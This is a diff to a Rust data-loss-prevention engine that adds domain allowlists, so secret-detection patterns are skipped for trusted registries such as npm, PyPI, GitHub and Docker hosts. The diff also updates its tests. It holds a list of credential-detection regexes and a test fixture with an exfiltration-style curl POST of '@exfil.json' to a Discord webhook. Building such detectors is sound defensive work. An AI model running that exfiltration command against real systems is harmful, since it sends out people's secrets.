@@ -14,6 +14,7 @@ struct CompiledPattern {
     name: String,
     regex: Regex,
     action: DlpAction,
+    allowed_domains: Vec<String>,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq)]
@@ -55,6 +56,7 @@ pub struct DlpEngine {
     pub max_scan_size: usize,
     #[allow(dead_code)]
     pub default_action: DlpAction,
+    pub allowed_domains: Vec<String>,
 }
 
 /// Signal that DLP rules should be reloaded from Dragonfly.
@@ -101,7 +103,15 @@ impl DlpEngine {
             inner: ArcSwap::new(Arc::new(inner)),
             max_scan_size: config.max_scan_size,
             default_action,
+            allowed_domains: config.allowed_domains.clone(),
         }
+    }
+
+    /// Check if a domain is globally exempt from DLP inspection.
+    pub fn is_domain_allowed(&self, host: &str) -> bool {
+        self.allowed_domains
+            .iter()
+            .any(|p| conduit_common::config::matches_domain_pattern(p, host))
     }
 
     /// Load/reload rules from Dragonfly and replace the current engine state.
@@ -126,9 +136,10 @@ impl DlpEngine {
         }
     }
 
-    /// Scan a body for DLP violations. Returns all matches found.
+    /// Scan a body for DLP violations against optional target host. Returns all matches found.
     /// Only scans up to `max_scan_size` bytes to bound CPU cost.
-    pub fn scan(&self, body: &[u8]) -> Vec<DlpMatch> {
+    /// If `host` matches a pattern's `allowed_domains`, that pattern is skipped.
+    pub fn scan(&self, body: &[u8], host: Option<&str>) -> Vec<DlpMatch> {
         let inner = self.inner.load();
         let body = &body[..body.len().min(inner.max_scan_size)];
         let text = match std::str::from_utf8(body) {
@@ -138,6 +149,17 @@ impl DlpEngine {
 
         let mut matches = Vec::new();
         for pattern in &inner.patterns {
+            // Check if current host is exempt from this pattern
+            if let Some(h) = host {
+                if pattern
+                    .allowed_domains
+                    .iter()
+                    .any(|p| conduit_common::config::matches_domain_pattern(p, h))
+                {
+                    continue;
+                }
+            }
+
             if let Some(mat) = pattern.regex.find(text) {
                 let snippet = crate::block_page::mask_sensitive(mat.as_str());
                 matches.push(DlpMatch {
@@ -164,63 +186,107 @@ impl DlpEngine {
 fn compile_from_config(config: &DlpConfig, default_action: DlpAction) -> Vec<CompiledPattern> {
     let mut patterns = Vec::new();
 
-    // Built-in patterns
-    let builtins = [
-        ("ssn", r"\b\d{3}-\d{2}-\d{4}\b"),
-        ("credit_card", r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b"),
-        ("aws_key", r"\bAKIA[0-9A-Z]{16}\b"),
+    // Built-in patterns with default domain exemptions for legitimate services
+    let builtins: [(&str, &str, &[&str]); 22] = [
+        ("ssn", r"\b\d{3}-\d{2}-\d{4}\b", &[]),
+        (
+            "credit_card",
+            r"\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b",
+            &[],
+        ),
+        ("aws_key", r"\bAKIA[0-9A-Z]{16}\b", &[]),
         (
             "npm_token",
             r"(?:\bnpm_[A-Za-z0-9]{32,40}\b|(?://registry\.npmjs\.org/:)?_authToken=[A-Za-z0-9_-]{32,})",
+            &["registry.npmjs.org", "*.npmjs.org", "registry.yarnpkg.com"],
         ),
-        ("pypi_token", r"\bpypi-[A-Za-z0-9_-]{50,}\b"),
-        ("rubygems_key", r"\brubygems_[a-f0-9]{48}\b"),
-        ("crates_token", r"\bcio[a-zA-Z0-9]{32}\b"),
+        (
+            "pypi_token",
+            r"\bpypi-[A-Za-z0-9_-]{50,}\b",
+            &["upload.pypi.org", "pypi.org", "*.pypi.org"],
+        ),
+        (
+            "rubygems_key",
+            r"\brubygems_[a-f0-9]{48}\b",
+            &["rubygems.org", "*.rubygems.org"],
+        ),
+        (
+            "crates_token",
+            r"\bcio[a-zA-Z0-9]{32}\b",
+            &["crates.io", "*.crates.io"],
+        ),
         (
             "github_pat",
             r"\b(?:ghp_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82})\b",
+            &["api.github.com", "github.com", "*.github.com"],
         ),
-        ("github_oauth", r"\b(?:gho|ghu|ghs|ghr)_[0-9a-zA-Z]{36}\b"),
-        ("gitlab_pat", r"\bglpat-[0-9a-zA-Z_-]{20,22}\b"),
+        (
+            "github_oauth",
+            r"\b(?:gho|ghu|ghs|ghr)_[0-9a-zA-Z]{36}\b",
+            &["api.github.com", "github.com", "*.github.com"],
+        ),
+        (
+            "gitlab_pat",
+            r"\bglpat-[0-9a-zA-Z_-]{20,22}\b",
+            &["gitlab.com", "*.gitlab.com"],
+        ),
         (
             "private_key",
             r"-----BEGIN (?:[A-Z0-9_-]+ )?PRIVATE KEY(?: BLOCK)?-----",
+            &[],
         ),
         (
             "aws_secret",
             r#"(?i)(?:aws_secret_access_key|aws_secret_key)\s*[:=]\s*["']?[A-Za-z0-9/+=]{40}["']?"#,
+            &[],
         ),
-        ("gcp_api_key", r"\bAIza[0-9A-Za-z\-_]{35}\b"),
+        ("gcp_api_key", r"\bAIza[0-9A-Za-z\-_]{35}\b", &[]),
         (
             "gcp_sa_key",
             r#"(?i)"type":\s*"service_account"|"private_key_id":\s*"[0-9a-f]{40}""#,
+            &[],
         ),
         (
             "azure_connection_string",
             r"(?i)DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{86,88}",
+            &[],
         ),
-        ("vault_token", r"\b[sb]\.[a-zA-Z0-9]{24,}\b"),
+        ("vault_token", r"\b[sb]\.[a-zA-Z0-9]{24,}\b", &[]),
         (
             "db_credentials",
             r"(?i)(?:postgres|postgresql|mysql|mongodb|mongodb\+srv|redis)://[^:\s/]*:[^@\s/]+@[^\s/]+",
+            &[],
         ),
         (
             "env_secret_export",
             r#"(?i)\b(?:export\s+)?(?:DB_PASSWORD|PASSWORD|PASSWD|SECRET_KEY|JWT_SECRET|AUTH_TOKEN)\s*=\s*["']?[^"'\s]{8,}["']?"#,
+            &[
+                "*.pkg.dev",
+                "*.docker.pkg.dev",
+                "*.gcr.io",
+                "docker.io",
+                "*.docker.io",
+                "ghcr.io",
+                "*.ecr.*.amazonaws.com",
+                "quay.io",
+                "*.quay.io",
+            ],
         ),
-        ("openai_key", r"\bsk-(?:proj-)?[a-zA-Z0-9_-]{32,}\b"),
-        ("anthropic_key", r"\bsk-ant-[a-zA-Z0-9_-]{32,}\b"),
+        ("openai_key", r"\bsk-(?:proj-)?[a-zA-Z0-9_-]{32,}\b", &[]),
+        ("anthropic_key", r"\bsk-ant-[a-zA-Z0-9_-]{32,}\b", &[]),
         (
             "slack_token",
             r"\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*\b",
+            &[],
         ),
         (
             "discord_webhook",
             r"https://(?:canary\.|ptb\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+",
+            &[],
         ),
     ];
 
-    for (name, pattern) in &builtins {
+    for (name, pattern, allowed) in &builtins {
         match regex::RegexBuilder::new(pattern)
             .size_limit(1_000_000)
             .build()
@@ -229,6 +295,7 @@ fn compile_from_config(config: &DlpConfig, default_action: DlpAction) -> Vec<Com
                 name: name.to_string(),
                 regex: re,
                 action: default_action,
+                allowed_domains: allowed.iter().map(|s| s.to_string()).collect(),
             }),
             Err(e) => warn!(name, "Failed to compile built-in DLP pattern: {e}"),
         }
@@ -246,6 +313,7 @@ fn compile_from_config(config: &DlpConfig, default_action: DlpAction) -> Vec<Com
                     name: custom.name.clone(),
                     regex: re,
                     action,
+                    allowed_domains: custom.allowed_domains.clone(),
                 });
             }
             Err(e) => warn!(name = %custom.name, "Failed to compile custom DLP pattern: {e}"),
@@ -272,6 +340,7 @@ fn compile_from_rules(rules: &[DlpRule]) -> Vec<CompiledPattern> {
                     name: rule.name.clone(),
                     regex: re,
                     action: rule.action.into(),
+                    allowed_domains: rule.allowed_domains.clone(),
                 });
             }
             Err(e) => warn!(name = %rule.name, id = %rule.id, "Failed to compile DLP rule: {e}"),
@@ -312,6 +381,7 @@ mod tests {
             enabled: true,
             max_scan_size: 1_048_576,
             action: action.to_string(),
+            allowed_domains: vec![],
             custom_patterns: vec![],
         }
     }
@@ -320,7 +390,7 @@ mod tests {
     fn test_ssn_detection() {
         let engine = DlpEngine::new(&test_config("log"));
         let body = b"My SSN is 123-45-6789 please wire money";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "ssn");
     }
@@ -329,7 +399,7 @@ mod tests {
     fn test_credit_card_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body = b"Card: 4111 1111 1111 1111";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert!(DlpEngine::should_block(&matches));
     }
@@ -338,7 +408,7 @@ mod tests {
     fn test_aws_key_detection() {
         let engine = DlpEngine::new(&test_config("log"));
         let body = b"Access key: AKIAIOSFODNN7EXAMPLE";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "aws_key");
     }
@@ -347,12 +417,12 @@ mod tests {
     fn test_npm_token_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body1 = b"npm_1234567890abcdefghijklmnopqrstuv";
-        let matches1 = engine.scan(body1);
+        let matches1 = engine.scan(body1, None);
         assert!(!matches1.is_empty());
         assert_eq!(matches1[0].pattern_name, "npm_token");
 
         let body2 = b"//registry.npmjs.org/:_authToken=npm_998877665544332211aabbccddeeff001122";
-        let matches2 = engine.scan(body2);
+        let matches2 = engine.scan(body2, None);
         assert!(!matches2.is_empty());
         assert_eq!(matches2[0].pattern_name, "npm_token");
     }
@@ -362,7 +432,7 @@ mod tests {
         let engine = DlpEngine::new(&test_config("block"));
         let body =
             b"token = pypi-AgEIcHlwaS5vcmcCJDM4MDI4ZmQ0LTkxNmMtNGY4Mi05ZWMzLTM5ODk0MWNhMGQ2ZAAAYz";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "pypi_token");
     }
@@ -371,7 +441,7 @@ mod tests {
     fn test_github_pat_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body = b"ghp_1234567890abcdefghijklmnopqrstuvwxyz";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "github_pat");
     }
@@ -380,12 +450,12 @@ mod tests {
     fn test_private_key_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body1 = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0";
-        let matches1 = engine.scan(body1);
+        let matches1 = engine.scan(body1, None);
         assert!(!matches1.is_empty());
         assert_eq!(matches1[0].pattern_name, "private_key");
 
         let body2 = b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA";
-        let matches2 = engine.scan(body2);
+        let matches2 = engine.scan(body2, None);
         assert!(!matches2.is_empty());
         assert_eq!(matches2[0].pattern_name, "private_key");
     }
@@ -394,7 +464,7 @@ mod tests {
     fn test_aws_secret_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body = b"aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "aws_secret");
     }
@@ -404,12 +474,12 @@ mod tests {
         let engine = DlpEngine::new(&test_config("block"));
         let body1 =
             b"DATABASE_URL=postgres://admin:SuperSecretPass123!@db.internal:5432/production";
-        let matches1 = engine.scan(body1);
+        let matches1 = engine.scan(body1, None);
         assert!(!matches1.is_empty());
         assert_eq!(matches1[0].pattern_name, "db_credentials");
 
         let body2 = b"REDIS_URL=redis://:MySecretPassword@redis.prod:6379";
-        let matches2 = engine.scan(body2);
+        let matches2 = engine.scan(body2, None);
         assert!(!matches2.is_empty());
         assert_eq!(matches2[0].pattern_name, "db_credentials");
     }
@@ -418,16 +488,35 @@ mod tests {
     fn test_env_secret_export_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body = b"export DB_PASSWORD=\"SuperSecretPassword123\"";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "env_secret_export");
+    }
+
+    #[test]
+    fn test_env_secret_export_docker_pkg_dev_allowed() {
+        let engine = DlpEngine::new(&test_config("block"));
+        let body = b"grant_type=refresh_token&service=us-central1-docker.pkg.dev&password=ya29.secrettoken12345";
+
+        // Without host or on an untrusted host, the pattern triggers
+        let matches_untrusted = engine.scan(body, Some("evil-site.com"));
+        assert!(!matches_untrusted.is_empty());
+        assert_eq!(matches_untrusted[0].pattern_name, "env_secret_export");
+
+        // When targeting us-central1-docker.pkg.dev, it is exempt
+        let matches_pkg_dev = engine.scan(body, Some("us-central1-docker.pkg.dev"));
+        assert!(matches_pkg_dev.is_empty());
+
+        // Also exempt for other docker registries like ghcr.io
+        let matches_ghcr = engine.scan(body, Some("ghcr.io"));
+        assert!(matches_ghcr.is_empty());
     }
 
     #[test]
     fn test_discord_webhook_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body = b"curl -X POST https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789 -d @exfil.json";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "discord_webhook");
     }
@@ -436,7 +525,7 @@ mod tests {
     fn test_openai_key_detection() {
         let engine = DlpEngine::new(&test_config("block"));
         let body = b"sk-proj-1234567890abcdefghijklmnopqrstuvwxyz123456";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].pattern_name, "openai_key");
     }
@@ -445,7 +534,7 @@ mod tests {
     fn test_no_match() {
         let engine = DlpEngine::new(&test_config("log"));
         let body = b"This is a normal request body with no sensitive data";
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(matches.is_empty());
     }
 
@@ -455,24 +544,33 @@ mod tests {
             enabled: true,
             max_scan_size: 1_048_576,
             action: "log".into(),
+            allowed_domains: vec![],
             custom_patterns: vec![DlpPattern {
                 name: "internal_id".into(),
                 regex: r"INTERNAL-\d{8}".into(),
                 action: "block".into(),
+                allowed_domains: vec!["internal.corp".into()],
             }],
         };
         let engine = DlpEngine::new(&config);
         let body = b"Document ref: INTERNAL-12345678";
-        let matches = engine.scan(body);
+        // Matches on external domain
+        let matches = engine.scan(body, Some("external.com"));
         assert!(matches.iter().any(|m| m.pattern_name == "internal_id"));
         assert!(DlpEngine::should_block(&matches));
+
+        // Exempt on internal.corp
+        let matches_exempt = engine.scan(body, Some("internal.corp"));
+        assert!(!matches_exempt
+            .iter()
+            .any(|m| m.pattern_name == "internal_id"));
     }
 
     #[test]
     fn test_binary_body_skipped() {
         let engine = DlpEngine::new(&test_config("log"));
         let body: &[u8] = &[0xFF, 0xFE, 0x00, 0x01, 0x80];
-        let matches = engine.scan(body);
+        let matches = engine.scan(body, None);
         assert!(matches.is_empty());
     }
 
@@ -487,6 +585,7 @@ mod tests {
                 enabled: true,
                 builtin: false,
                 hits: 0,
+                allowed_domains: vec![],
             },
             DlpRule {
                 id: "2".into(),
@@ -496,6 +595,7 @@ mod tests {
                 enabled: false,
                 builtin: false,
                 hits: 0,
+                allowed_domains: vec![],
             },
         ];
         let patterns = compile_from_rules(&rules);
